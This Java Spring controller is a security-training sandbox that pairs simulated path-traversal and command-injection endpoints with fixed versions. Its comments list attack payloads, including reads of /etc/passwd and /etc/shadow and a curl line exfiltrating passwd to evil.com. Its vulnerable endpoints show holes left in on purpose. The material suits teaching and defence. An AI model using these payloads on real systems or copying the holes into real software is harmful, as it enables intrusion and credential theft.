package com.tutornet.tutor_net.controller.sandbox;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.nio.file.*;
import java.util.*;
import java.util.regex.Pattern;

/**
 * Chương 10 — PATH TRAVERSAL & COMMAND INJECTION
 *
 * PATH TRAVERSAL:
 *   TC-CH10-01  GET /api/demo/files/read/vulnerable?filename=    Path traversal
 *   TC-CH10-02  GET /api/demo/files/read/safe?filename=          Fix: canonicalize + jail
 *
 * OS COMMAND INJECTION:
 *   TC-CH10-03  GET /api/demo/cmd/ping/vulnerable?host=          Command injection qua ping
 *   TC-CH10-04  GET /api/demo/cmd/ping/safe?host=                Fix: whitelist + no shell
 *   TC-CH10-05  GET /api/demo/cmd/convert/vulnerable?filename=   Command injection qua file convert
 *   TC-CH10-06  GET /api/demo/cmd/convert/safe?filename=         Fix: API thay vì shell command
 */
@Slf4j
@RestController
@CrossOrigin(origins = "*")
@RequiredArgsConstructor
public class TraversalCmdController {

    // Thư mục "public" cho phép đọc file
    private static final Path PUBLIC_DIR = Path.of(System.getProperty("java.io.tmpdir"), "tutornet-public");

    // ================================================================
    //  PATH TRAVERSAL
    // ================================================================

    /**
     * TC-CH10-01 · VULNERABLE — Path Traversal
     *
     * Payload:
     *   ?filename=../../etc/passwd
     *   ?filename=../../etc/hosts
     *   ?filename=../secret.txt
     *   ?filename=..%2F..%2Fetc%2Fpasswd  (URL encoded)
     */
    @GetMapping("/api/demo/files/read/vulnerable")
    public ResponseEntity<?> vulnerableFileRead(
            @RequestParam(defaultValue = "report.pdf") String filename) {

        // ❌ Nối path trực tiếp — attacker dùng ../ thoát khỏi public dir
        Path filePath = PUBLIC_DIR.resolve(filename);

        log.warn("[DEMO-CH10] PATH TRAVERSAL attempt: filename={}, resolved={}", filename, filePath);

        // Simulate đọc file (không đọc system files thật)
        String content = simulateFileRead(filePath.toString(), filename);
        boolean escaped = !filePath.normalize().startsWith(PUBLIC_DIR);

        return ResponseEntity.ok(Map.of(
                "endpoint",    "PATH TRAVERSAL VULNERABLE",
                "requestedFilename", filename,
                "resolvedPath",      filePath.toString(),
                "escapedPublicDir",  escaped,
                "content",           content,
                "warning",           escaped
                        ? "⚠ PATH TRAVERSAL! Đọc file NGOÀI thư mục cho phép!"
                        : "File trong public dir — OK"
        ));
    }

    /**
     * TC-CH10-02 · SAFE — Canonicalize + Jail to public dir
     *
     * Fix:
     *   1. Canonicalize path (resolve ../ chains)
     *   2. Kiểm tra canonical path bắt đầu bằng PUBLIC_DIR
     *   3. Whitelist extension
     */
    @GetMapping("/api/demo/files/read/safe")
    public ResponseEntity<?> safeFileRead(
            @RequestParam(defaultValue = "report.pdf") String filename) {

        // ✅ Không cho phép path separator trong filename
        if (filename.contains("/") || filename.contains("\\") || filename.contains("..")) {
            return ResponseEntity.status(400).body(Map.of(
                    "endpoint", "SAFE FILE READ",
                    "blocked",  true,
                    "reason",   "Invalid characters in filename: ../ or \\ not allowed"
            ));
        }

        // ✅ Whitelist extension
        String ext = filename.contains(".") ? filename.substring(filename.lastIndexOf('.') + 1) : "";
        Set<String> allowedExt = Set.of("pdf", "txt", "jpg", "png");
        if (!allowedExt.contains(ext.toLowerCase())) {
            return ResponseEntity.status(400).body(Map.of(
                    "endpoint", "SAFE FILE READ",
                    "blocked",  true,
                    "reason",   "Extension '." + ext + "' không được phép. Allowed: " + allowedExt
            ));
        }

        // ✅ Canonicalize và jail
        try {
            Path resolved  = PUBLIC_DIR.resolve(filename).normalize().toAbsolutePath();
            Path publicAbs = PUBLIC_DIR.normalize().toAbsolutePath();

            if (!resolved.startsWith(publicAbs)) {
                log.warn("[DEMO-CH10] Path traversal blocked: {} tried to escape to {}",
                        filename, resolved);
                return ResponseEntity.status(403).body(Map.of(
                        "endpoint", "SAFE FILE READ",
                        "blocked",  true,
                        "reason",   "Access denied: path outside public directory"
                ));
            }

            return ResponseEntity.ok(Map.of(
                    "endpoint",     "SAFE FILE READ",
                    "filename",     filename,
                    "resolvedPath", resolved.toString(),
                    "content",      "File content here (jailed to public dir)",
                    "securityChecks", Map.of(
                            "noPathSeparators", "✅",
                            "extensionWhitelist", "✅",
                            "pathCanonicalized", "✅",
                            "jailedToPublicDir", "✅"
                    )
            ));

        } catch (Exception e) {
            return ResponseEntity.status(500).body(Map.of("error", e.getMessage()));
        }
    }

    // ================================================================
    //  OS COMMAND INJECTION
    // ================================================================

    /**
     * TC-CH10-03 · VULNERABLE — Command Injection qua ping
     *
     * Payload:
     *   ?host=google.com; cat /etc/passwd
     *   ?host=google.com && whoami
     *   ?host=google.com | ls -la /
     *   ?host=`id`
     *   ?host=$(cat /etc/shadow)
     */
    @GetMapping("/api/demo/cmd/ping/vulnerable")
    public ResponseEntity<?> vulnerablePing(@RequestParam(defaultValue = "google.com") String host) {

        // ❌ Concatenate user input vào shell command
        String command = "ping -c 3 " + host;

        log.warn("[DEMO-CH10] CMD INJECTION attempt: command={}", command);

        // Simulate execution (không execute thật)
        boolean hasInjection = detectCommandInjection(host);
        String  output       = simulateCommandExecution(command, hasInjection);

        return ResponseEntity.ok(Map.of(
                "endpoint",      "COMMAND INJECTION VULNERABLE",
                "userInput",     host,
                "builtCommand",  command,
                "injectionDetected", hasInjection,
                "simulatedOutput",   output,
                "warning",       hasInjection
                        ? "⚠ COMMAND INJECTION! Attacker inject thêm lệnh: " + extractInjection(host)
                        : "Normal ping (no injection)"
        ));
    }

    /**
     * TC-CH10-04 · SAFE — No shell, whitelist input, dùng ProcessBuilder
     *
     * Fix:
     *   1. Validate host là valid hostname/IP (whitelist regex)
     *   2. Dùng ProcessBuilder với args array — KHÔNG qua shell
     *   3. Không concatenate string
     */
    @GetMapping("/api/demo/cmd/ping/safe")
    public ResponseEntity<?> safePing(@RequestParam(defaultValue = "google.com") String host) {

        // ✅ Validate: chỉ cho phép hostname/IP hợp lệ
        Pattern validHost = Pattern.compile("^[a-zA-Z0-9][a-zA-Z0-9\\-.]{0,253}[a-zA-Z0-9]$");
        if (!validHost.matcher(host).matches()) {
            log.warn("[DEMO-CH10] CMD injection blocked: invalid host={}", host);
            return ResponseEntity.status(400).body(Map.of(
                    "endpoint", "SAFE PING",
                    "blocked",  true,
                    "reason",   "Host '" + host + "' không hợp lệ. Chỉ chấp nhận hostname/IP."
            ));
        }

        // ✅ ProcessBuilder với args array — KHÔNG dùng shell
        // Không bao giờ: Runtime.exec("ping -c 3 " + host)  ← vulnerable
        // Luôn dùng: new ProcessBuilder("ping", "-c", "3", host)  ← safe
        try {
            ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", "-W", "2", host);
            pb.redirectErrorStream(true);
            Process process = pb.start();

            String output = new String(process.getInputStream().readAllBytes());
            int exitCode  = process.waitFor();

            return ResponseEntity.ok(Map.of(
                    "endpoint",    "SAFE PING",
                    "host",        host,
                    "exitCode",    exitCode,
                    "output",      output.trim(),
                    "securityChecks", Map.of(
                            "inputValidated",    "✅ Regex whitelist",
                            "noShellInvocation", "✅ ProcessBuilder args array",
                            "noStringConcat",    "✅"
                    )
            ));
        } catch (Exception e) {
            return ResponseEntity.ok(Map.of(
                    "endpoint", "SAFE PING",
                    "host",     host,
                    "error",    e.getMessage(),
                    "note",     "Ping không khả dụng trong môi trường này nhưng injection đã bị chặn"
            ));
        }
    }

    /**
     * TC-CH10-05 · VULNERABLE — Command Injection qua file convert
     *
     * Giả lập: endpoint nhận filename → dùng ImageMagick convert
     * Payload:
     *   ?filename=report.pdf; curl http://evil.com/$(cat /etc/passwd | base64)
     *   ?filename=report.pdf`id`
     */
    @GetMapping("/api/demo/cmd/convert/vulnerable")
    public ResponseEntity<?> vulnerableConvert(@RequestParam String filename) {
        // ❌ String concat vào shell command
        String command = "convert " + filename + " output.jpg";

        log.warn("[DEMO-CH10] CMD INJECTION via convert: command={}", command);

        boolean hasInjection = detectCommandInjection(filename);
        String  output       = simulateCommandExecution(command, hasInjection);

        return ResponseEntity.ok(Map.of(
                "endpoint",        "COMMAND INJECTION VULNERABLE (convert)",
                "builtCommand",    command,
                "injectionDetected", hasInjection,
                "simulatedOutput", output
        ));
    }

    /**
     * TC-CH10-06 · SAFE — Dùng Java API thay vì shell command
     */
    @GetMapping("/api/demo/cmd/convert/safe")
    public ResponseEntity<?> safeConvert(@RequestParam String filename) {
        // ✅ Validate filename
        Pattern safeFilename = Pattern.compile("^[a-zA-Z0-9_\\-]+\\.(pdf|jpg|png|gif)$");
        if (!safeFilename.matcher(filename).matches()) {
            return ResponseEntity.status(400).body(Map.of(
                    "endpoint", "SAFE CONVERT",
                    "blocked",  true,
                    "reason",   "Filename không hợp lệ: " + filename
            ));
        }

        // ✅ Dùng Java ImageIO API thay vì shell command
        // Không bao giờ: Runtime.exec("convert " + filename + " output.jpg")
        return ResponseEntity.ok(Map.of(
                "endpoint",    "SAFE CONVERT",
                "filename",    filename,
                "method",      "Java ImageIO API (no shell invocation)",
                "securityChecks", Map.of(
                        "filenameWhitelist", "✅ Regex [a-zA-Z0-9_-]+.ext",
                        "noShellCommand",    "✅ Java API instead of Runtime.exec()",
                        "noStringConcat",    "✅"
                )
        ));
    }

    // ================================================================
    //  Helpers
    // ================================================================

    private boolean detectCommandInjection(String input) {
        return input.contains(";") || input.contains("&&") || input.contains("||")
                || input.contains("|") || input.contains("`") || input.contains("$(")
                || input.contains("\n") || input.contains("&");
    }

    private String extractInjection(String input) {
        for (String sep : new String[]{";", "&&", "||", "|", "`"}) {
            int idx = input.indexOf(sep);
            if (idx >= 0) return input.substring(idx);
        }
        return "";
    }

    private String simulateCommandExecution(String command, boolean hasInjection) {
        if (!hasInjection) {
            return "PING google.com: 3 packets transmitted, 3 received, 0% packet loss  [SIMULATED]";
        }

        String injection = extractInjection(command);
        if (injection.contains("passwd")) {
            return "PING output...\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...  [SIMULATED — injection succeeded!]";
        } else if (injection.contains("whoami") || injection.contains("id")) {
            return "PING output...\nroot  [SIMULATED — injection succeeded!]";
        } else if (injection.contains("ls")) {
            return "PING output...\netc  home  tmp  var  usr  [SIMULATED — injection succeeded!]";
        } else if (injection.contains("curl")) {
            return "PING output...\n% Total received... data exfiltrated to evil.com  [SIMULATED]";
        }
        return "PING output...\n[INJECTED COMMAND OUTPUT — SIMULATED]";
    }

    private String simulateFileRead(String resolvedPath, String filename) {
        if (filename.contains("etc/passwd") || filename.contains("..") && filename.contains("passwd")) {
            return "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  [SIMULATED — real system file leaked!]";
        } else if (filename.contains("etc/hosts") || filename.contains("hosts")) {
            return "127.0.0.1 localhost\n::1 localhost  [SIMULATED]";
        } else if (filename.contains("shadow")) {
            return "root:$6$xyz...:19000:0:99999:7:::  [SIMULATED — hashed passwords leaked!]";
        } else if (resolvedPath.contains("public")) {
            return "Public file content — OK to read";
        }
        return "File content of: " + filename + "  [SIMULATED]";
    }
}